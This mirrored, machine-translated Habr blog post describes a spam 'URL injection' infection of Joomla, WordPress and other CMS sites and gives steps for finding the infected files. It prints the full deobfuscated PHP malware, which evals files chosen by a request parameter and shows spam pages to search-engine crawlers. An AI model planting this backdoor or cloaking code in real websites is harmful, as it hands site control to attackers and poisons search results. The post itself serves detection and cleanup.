<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Implementation via URL: www.site.ru/?jn=xxxxxxxx</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Just recently, I encountered a new (*?) Version of the spam virus for websites. Google defines it as "URL injection." 

 Description 
 There are links...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Implementation via URL: www.site.ru/?jn=xxxxxxxx</h1><div class="post__text post__text-html js-mediator-article">  Just recently, I encountered a new (*?) Version of the spam virus for websites.  Google defines it as "URL injection." <br><br><h5>  <b>Description</b> </h5><br>  There are links on your site that did not exist and could not be - for example, you clearly know the structure of the site and the original URL, which differs from the ‚Äúleft‚Äù URL.  In particular, the following links appear in the index of search engines: <br><blockquote>  <a href="http://www.site.ru/%3Fjn%3Dxxxxxxxx">www.site.ru/?jn=xxxxxxxx</a> </blockquote><br><h5>  <b>Search and elimination</b> </h5><br>  Yandex Webmaster does not respond to them yet, but in Google‚Äôs tools for webmasters a warning is issued about a possible hacking of the site.  There are also recommendations for the search.  Unfortunately, they are quite common and specific search problems takes time.  Antiviruses and online site analyzers do not give any results.  Only pens. <br><br><h5>  <b>Option A: Code not obfustsirovan</b> </h5><br><ol><li>  We are looking for in the source who and how we use the variable $ _GET ['jn'] </li><li>  Next on the code we see who shits where (for example: \ js \ swfupload \ plugins \ jquery \) </li></ol><br><h5>  <b>Option B: Code Obfuscated</b> </h5><br><ol><li>  We are looking for a directory with files whose names come after "? Jn =" </li><li>  We are looking for suspicious executable files such as images / c0nfv.php </li><li>  You can do a search for paths where there may be files a la "/img/icon/thumb/jquery.php" </li><li>  Check CMS Config Date Modified </li><li>  It is recommended to check for the presence (correctness) of the base.php files - this is the body of the virus itself, the code is obfuscated </li><li>  We check the date jquery.php and compare it with the date of detection of the virus by monitoring the tools of Google webmasters. </li></ol><br><h5>  <b>Is encountered</b> </h5><br><ul><li>  CMS: Joomla, WordPress, DLE, PrestaShop, HostCMS </li><li>  Plugins: ImageZoomer, SWFupload, BlockCategories </li><li>  There is a high probability of occurrence in almost all plug-ins that use jQuery and in those places where admins have not got the handle to the settings. </li></ul><br>  The full code (neobfustsirovannogo) malicious code under the cut. <br><a name="habracut"></a><br><pre><code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_GET[<span class="hljs-string"><span class="hljs-string">'jn'</span></span>])){ini_set<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>(strrev(<span class="hljs-string"><span class="hljs-string">"gnitroper_rorre"</span></span>),<span class="hljs-number"><span class="hljs-number">0</span></span>);<span class="hljs-keyword"><span class="hljs-keyword">include</span></span> <span class="hljs-string"><span class="hljs-string">"images/c0nfv.php"</span></span>;$uhvuusgp=str_replace(<span class="hljs-string"><span class="hljs-string">'..'</span></span>,<span class="hljs-string"><span class="hljs-string">''</span></span>,$_GET[$qjkx]);<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(is_file($ftdavmbe.<span class="hljs-string"><span class="hljs-string">'/'</span></span>.$uhvuusgp)){header(<span class="hljs-string"><span class="hljs-string">'Content-Type: text/html; charset=windows-1251'</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>);<span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-keyword"><span class="hljs-keyword">eval</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span>(<span class="hljs-string"><span class="hljs-string">'?&gt;'</span></span>.join(<span class="hljs-string"><span class="hljs-string">""</span></span>,file($ftdavmbe.<span class="hljs-string"><span class="hljs-string">"/$uhvuusgp"</span></span>)).<span class="hljs-string"><span class="hljs-string">'&lt;?'</span></span>);<span class="hljs-keyword"><span class="hljs-keyword">die</span></span>;}}<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(preg_match(<span class="hljs-string"><span class="hljs-string">"/(yandex|google)/i"</span></span>, $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_USER_AGENT'</span></span>])){ini_set<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>(strrev(<span class="hljs-string"><span class="hljs-string">"gnitroper_rorre"</span></span>),<span class="hljs-number"><span class="hljs-number">0</span></span>);<span class="hljs-keyword"><span class="hljs-keyword">include</span></span> <span class="hljs-string"><span class="hljs-string">"images/c0nfv.php"</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(is_file($ftdavmbe.<span class="hljs-string"><span class="hljs-string">"/db.php"</span></span>)){<span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $ftdavmbe.<span class="hljs-string"><span class="hljs-string">"/db.php"</span></span>;$jxbecpzx=preg_replace(<span class="hljs-string"><span class="hljs-string">"/[0]*$/"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>, preg_replace(<span class="hljs-string"><span class="hljs-string">"/\.*/"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>,(string)sprintf(<span class="hljs-string"><span class="hljs-string">'%f'</span></span>, hexdec(sha1($_SERVER[<span class="hljs-string"><span class="hljs-string">'SERVER_NAME'</span></span>].$_SERVER[<span class="hljs-string"><span class="hljs-string">'REQUEST_URI'</span></span>])))));$iwtcrjis=substr($jxbecpzx,<span class="hljs-number"><span class="hljs-number">20</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>);<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr($iwtcrjis,<span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)==<span class="hljs-number"><span class="hljs-number">0</span></span>){<span class="hljs-keyword"><span class="hljs-keyword">do</span></span>{$x++;$iwtcrjis=substr($jxbecpzx,<span class="hljs-number"><span class="hljs-number">20</span></span>+$x,<span class="hljs-number"><span class="hljs-number">3</span></span>);}<span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(substr($iwtcrjis,<span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>)==<span class="hljs-number"><span class="hljs-number">0</span></span>);}<span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $ftdavmbe.<span class="hljs-string"><span class="hljs-string">"/"</span></span>.$iwtcrjisy[$iwtcrjis];<span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> mb_convert_encoding($ohjjpibn[<span class="hljs-number"><span class="hljs-number">72</span></span>], <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>, <span class="hljs-string"><span class="hljs-string">'Windows-1251'</span></span>);}}<span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br><h4>  <b>Causes of hacking</b> </h4><br>  The options are most likely 3: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  Open to write directory on the server; </li><li>  Vulnerability in the software that runs on the site, as a rule, these are free CMS (content management systems).  For example, if you are using an outdated and insecure version; </li><li>  Hacking third-party plug-ins on the site (working with JQUERY). </li></ul></div><p>Source: <a href="https://habr.com/ru/post/246353/">https://habr.com/ru/post/246353/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../246331/index.html">Expressive JavaScript: Project: Experience Sharing Website</a></li>
<li><a href="../246339/index.html">Some interesting MySQL features</a></li>
<li><a href="../246341/index.html">IPv6, miredo, dynamic DNS AAAA</a></li>
<li><a href="../246349/index.html">Yeoman for newbies</a></li>
<li><a href="../246351/index.html">Universal messaging between pages in extensions</a></li>
<li><a href="../246355/index.html">Skype for Android is not working! How did I handle this?</a></li>
<li><a href="../246357/index.html">PhpStorm in Ubuntu 14 using in Windows 7 via Xming</a></li>
<li><a href="../246359/index.html">We save on the Internet in a small office</a></li>
<li><a href="../246365/index.html">Final WGDC ‚Äã‚Äãevent through the eyes of the organizer</a></li>
<li><a href="../246369/index.html">6 games in 6 weeks - the fourth game</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>